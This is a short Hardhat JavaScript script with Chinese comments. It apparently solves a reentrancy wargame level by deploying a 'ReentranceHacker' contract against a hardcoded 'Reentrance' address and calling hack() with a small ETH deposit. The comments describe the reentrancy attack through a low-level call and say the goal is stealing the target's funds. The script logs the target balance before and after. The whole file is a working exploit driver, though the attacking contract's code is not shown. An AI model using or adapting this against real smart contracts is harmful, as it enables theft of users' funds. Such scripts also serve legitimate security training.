const { ethers } = require("hardhat");
/*
  通过 低级调用call及receive漏洞实现重入攻击
*/

// Reentrance合约地址
const ReentranceAddress = "0xFcB1e2e3C19e9A0584D6057c2457d63579655a7b";
const DONATE_VALUE = ethers.parseEther("0.001");

// 部署ReentranceHacker合约
async function DeployReentranceHacker() {
    const [hacker] = await ethers.getSigners();
    const ReentranceHacker = await ethers.getContractFactory("ReentranceHacker"); // 获取合约工厂
    const reentranceHacker = await ReentranceHacker.connect(hacker).deploy(ReentranceAddress); // 部署合约
    await reentranceHacker.waitForDeployment(); // 等待部署完成

    console.log("ReentranceHacker deployed to:", await reentranceHacker.getAddress()); // 打印合约地址
    return await reentranceHacker.getAddress();
}


// 攻击脚本
async function ReentranceHackerScript() {

    console.log("攻击前 reentrance balance = ", await ethers.provider.getBalance(ReentranceAddress))

    const ReentranceHackerAddress = await DeployReentranceHacker();

    // 加载攻击合约
    const reentranceHacker = await ethers.getContractAt("ReentranceHacker", ReentranceHackerAddress);

    // 加载目标合约
    const reentrance = await ethers.getContractAt("Reentrance", ReentranceAddress);

    // 攻击，盗取资金
    let tx = await reentranceHacker.hack({value: DONATE_VALUE});
    await tx.wait() 


    console.log("攻击后 reentrance balance = ", await ethers.provider.getBalance(ReentranceAddress))
}

ReentranceHackerScript().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});